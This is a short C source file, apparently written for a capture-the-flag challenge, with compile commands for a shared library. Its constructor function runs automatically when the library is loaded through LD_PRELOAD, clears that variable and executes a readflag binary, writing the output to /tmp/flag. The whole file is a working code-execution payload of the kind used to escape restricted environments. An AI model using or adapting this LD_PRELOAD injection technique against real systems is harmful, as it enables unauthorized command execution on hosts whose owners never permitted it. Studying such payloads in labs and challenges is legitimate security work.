/*
gcc -c -Wall -Werror -fpic exec.c
gcc -shared exec.o -o exec.so
*/
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__ ((__constructor__)) void anything (void){
    unsetenv("LD_PRELOAD");
    system("./readflag > /tmp/flag");
}
